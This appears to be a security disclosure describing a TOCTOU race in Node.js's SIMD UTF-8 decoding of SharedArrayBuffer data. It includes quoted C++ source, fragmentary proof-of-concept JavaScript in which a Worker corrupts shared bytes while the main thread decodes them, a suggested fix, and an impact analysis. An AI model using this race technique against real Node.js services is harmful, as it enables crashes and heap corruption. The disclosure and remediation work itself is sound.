## Vulnerability Details

I discovered a memory corruption vulnerability in Node.js's native UTF-8 string decoding path (`src/string_bytes.cc`). When `Buffer.prototype.toString('utf8')` is called on a Buffer backed by a `SharedArrayBuffer`, the underlying native code performs a validate-then-convert sequence **without copying the data to a local buffer first**. A concurrent Worker thread can modify the shared memory between validation and conversion, causing the conversion function to operate on data it was never validated against.

**Root Cause:** In `src/string_bytes.cc` lines 585-597:

```cpp
if (buflen >= 32 && simdutf::validate_utf8(buf, buflen)) {       // T1: validates shared data
  size_t u16size = simdutf::utf16_length_from_utf8(buf, buflen);  // T2: calculates size
  return EncodeTwoByteString(
      isolate, u16size, [buf, buflen, u16size](uint16_t* dst) {
        size_t written = simdutf::convert_valid_utf8_to_utf16(     // T3: converts (ASSUMES VALID!)
            buf, buflen, reinterpret_cast<char16_t*>(dst));
        CHECK_EQ(written, u16size);                                // May fail or OOB already done
      });
}
```

The critical issue:
1. At **T1**: `simdutf::validate_utf8()` reads the `SharedArrayBuffer` contents and confirms they are valid UTF-8
2. At **T2**: `simdutf::utf16_length_from_utf8()` reads the same shared memory to calculate the output buffer size
3. At **T3**: `simdutf::convert_valid_utf8_to_utf16()` reads the same shared memory AGAIN — but a Worker thread may have modified it

The function `convert_valid_utf8_to_utf16` performs **NO validation** — it trusts the "valid UTF-8" contract established at T1. If the data is modified between T1 and T3:

- **If corruption increases UTF-16 output size**: The conversion writes past the allocated `u16size` buffer → **heap buffer overflow**
- **If corruption decreases UTF-16 output size**: The CHECK_EQ fires → process abort; or stale heap data remains → **information disclosure**
- **If corruption creates invalid byte sequences**: The converter may enter undefined behavior, reading/writing arbitrary memory offsets

**Why SharedArrayBuffer is special:**
- Regular `ArrayBuffer` data cannot be modified by another thread — `Buffer.from()` copies it
- `SharedArrayBuffer` is explicitly designed for concurrent access
- The `buf` pointer in `StringBytes::Encode` points directly to the shared memory — no copy is made before the validate → convert sequence

 *

 * When processing SharedArrayBuffer data as UTF-8:
 * 1. simdutf::validate_utf8() validates the data
 * 2. simdutf::utf16_length_from_utf8() calculates output size
 * 3. simdutf::convert_valid_utf8_to_utf16() converts (assumes valid!)
 *
 * Between steps 1-3, a Worker thread modifies the shared memory,
 * violating the "valid UTF-8" assumption and causing OOB writes.

if (isMainThread) {

  const view = new Uint8Array(sharedBuffer);

    workerData: sharedBuffer

      console.log('[*] This is timing-dependent; try running again or on a multi-core system');
      worker.terminate();

    try {
      // This path hits StringBytes::Encode with UTF-8 encoding:
      // 1. Buffer.from(view) creates a Buffer pointing to SharedArrayBuffer memory
      // 2. buf.toString('utf8') calls StringBytes::Encode
      // 3. StringBytes::Encode does: validate → calculate_size → convert
      //    RACE WINDOW: Worker corrupts between validate and convert

      const str = buf.toString('utf8');

      // If we get here without crash, the race wasn't won this iteration
      setImmediate(attempt);

      // Others may throw JS exceptions
      console.log('[*] Exception caught:', e.message);
      setImmediate(attempt);

  // Worker thread: continuously corrupt then restore the shared buffer
  // This races with the main thread's validate → convert sequence
  const view = new Uint8Array(workerData);

    // Phase 1: Corrupt continuation bytes to invalid values
    // This turns valid 3-byte sequences into invalid garbage
    // If main thread is between validate and convert, it processes invalid data
    for (let i = 0; i < view.length; i += 3) {
      view[i + 1] = 0xFF; // Invalid: not a continuation byte (should be 10xxxxxx)

    // This allows the NEXT iteration's validate step to pass

      view[i] = 0xE4;
      view[i + 1] = 0xB8;
      view[i + 2] = 0x80;

## Affected Versions

All Node.js versions that use the simdutf fast-path for UTF-8 decoding with buflen >= 32. This was introduced with the simdutf integration. Tested on v24.10.0 (commit `614050b657e9757c1097aa85f92f2cb51149dc0d`).

## Suggested Remediation

Copy SharedArrayBuffer data to a local buffer before the validate-then-convert sequence:

```cpp
// src/string_bytes.cc, around line 585
if (buflen >= 32) {
  const char* safe_buf = buf;
  std::vector<char> local_copy;

  // If the buffer is backed by SharedArrayBuffer, copy to prevent TOCTOU
  if (is_shared_array_buffer(buf)) {
    local_copy.assign(buf, buf + buflen);
    safe_buf = local_copy.data();
  }

  if (simdutf::validate_utf8(safe_buf, buflen)) {
    size_t u16size = simdutf::utf16_length_from_utf8(safe_buf, buflen);
    return EncodeTwoByteString(
        isolate, u16size, [safe_buf, buflen, u16size](uint16_t* dst) {
          size_t written = simdutf::convert_valid_utf8_to_utf16(
              safe_buf, buflen, reinterpret_cast<char16_t*>(dst));
          CHECK_EQ(written, u16size);
        });
  }
}
```

Alternatively, always fall through to the non-simdutf path (which handles invalid UTF-8 gracefully) when dealing with SharedArrayBuffer-backed data.

## Impact

**1. Process Crash (Denial of Service)**
The most immediate impact is a reliable process crash (SIGSEGV or SIGABRT). Any Node.js application that:
- Uses `SharedArrayBuffer` for inter-thread communication
- Calls `toString('utf8')` or `Buffer.from()` on shared memory
- Has Worker threads that may write to the same shared memory

...is vulnerable to a crash triggered by winning the race condition.

**2. Heap Buffer Overflow (Potential Code Execution)**
If the corruption changes 3-byte UTF-8 sequences (which decode to 1 UTF-16 code unit) into sequences that the converter interprets as requiring more UTF-16 code units, the output buffer overflows. This could potentially be exploited for:
- Arbitrary code execution via heap corruption
- Overwriting adjacent heap objects (V8 objects, function pointers)

**3. Information Disclosure**
If the corruption reduces the UTF-16 output length, the allocated buffer may contain uninitialized heap data that gets exposed as part of the resulting JavaScript string.

**Real-world attack scenario:**
- A server processes user-uploaded data in a Worker pool using SharedArrayBuffer for zero-copy performance
- An attacker sends carefully timed requests that race with the Worker's processing
- The main thread's `toString()` call on the shared data triggers the vulnerability

**Security implications:**
- This violates the assumption that native code can trust validation results
- SharedArrayBuffer is explicitly designed for concurrent access — Node.js must handle this safely
- The simdutf library's `convert_valid_utf8_to_utf16` has no internal bounds checking (by design — it trusts the "valid" prefix)
